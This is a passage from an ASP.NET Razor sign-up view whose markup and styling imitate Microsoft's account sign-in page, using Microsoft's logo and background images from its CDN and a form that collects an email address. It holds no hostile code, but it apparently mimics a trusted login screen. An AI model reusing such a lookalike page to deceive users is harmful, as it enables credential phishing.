@page "/sign-up"
@model SignUpViewModel
@{
    ViewData["Title"] = "Sign up";
    Layout = "_AnonymousLayout";
}

<div class="root">
    <div>
        <div class="direction-wrapper">
            <div style="position: absolute; height: 100%; width: 100%; top: 0px; right: 0px; left: 0px; bottom: 0px; overflow-x: auto; overflow-y: auto;">
                <div class="background-container">
                    <div class="background-image"></div>
                </div>

                <div class="outer">
                    <div class="middle">
                        <div>
                            <div>
                                <div>
                                    <div class="inner">
                                        <div class="lightbox-cover">
                                        </div>

                                        <div>
                                            <img class="form-logo" src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
                                            
                                            <div>
                                                <button class="back-button" type="button">
                                                    <img role="presentation" src="https://logincdn.msftauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg">
                                                </button>
                                                
                                                <div class="current-email">@Model.EmailAddress</div>
                                            </div>

                                            <div class="page-content">
                                                <div class="route-animation">
                                                    <form method="post" target="_top" spellcheck="false" autocomplete="off">
                                                        <div class="form-header">
                                                            <div>
                                                                <div role="heading">@ViewData["Title"]</div>
                                                            </div>
                                                        </div>
                                                        
                                                        <div class="form-body">
                                                            <div style="overflow-wrap: break-word; white-space: pre-wrap;">
                                                                <div style="min-height: 1px; margin-left: 0px; margin-right: 0px;">
                                                                    <div role="alert">
                                                                        <span class="email-error" asp-validation-for="EmailAddress"></span>
                                                                    </div>

                                                                    <div style="display: flex; flex-direction: row;">
                                                                        <div class="emai-input-container">
                                                                            <input asp-for="EmailAddress" class="email-input" placeholder="someone@example.com" type="text"/>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        
                                                        <div class="form-footer">
                                                            <div style="display: inline-block; width: 100%; margin-bottom: 36px;">
                                                                <div style="min-height: 1px; margin-left: 0px; margin-right: 0px;">
                                                                    <div class="form-footer-row">
                                                                        <div style="display: inline-block;">
                                                                            <button class="next-button" type="submit">Next</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="footer">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

@section Scripts {
    <partial name="_ClientValidation" />
}

<style>
* {
    box-sizing: border-box;
}

body {
    font-weight: 400;
    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
    font-size: 0.9375rem;
    line-height: 1.25rem;
    margin: 0px;
    background-color: rgb(255, 255, 255);
}

button, input, select, textarea {
    font-weight: inherit;
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
    max-width: 100%;
    margin: 0px;
}

.root {
    min-height: 1px;
}

.direction-wrapper {
    min-height: 1px;
}

.background-container {
    height: 100%;
    width: 100%;
    top: 0px;
    left: 0px;
    z-index: -1;
    position: fixed;
    background-size: cover;
    background-repeat: no-repeat;
    background-position-x: 50%;
    background-position-y: 50%;
    background-color: rgb(242, 242, 242);    
}

.background-image {
    height: 100%;
    width: 100%;
    top: 0px;
    left: 0px;
    z-index: -1;
    position: fixed;
    background-size: cover;
    background-repeat: no-repeat;
    background-position-x: 50%;
    background-position-y: 50%;
    background-image: url(https://logincdn.msftauth.net/shared/5/images/2_bc3d32a696895f78c19d.svg);
}

.outer {
    position: absolute;
    height: 100%;
    width: 100%;
    top: 0px;
    right: 0px;
    left: 0px;
    bottom: 0px;
    display: table;
}

.middle {
    display: table-cell;
    vertical-align: middle;
}


.inner {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
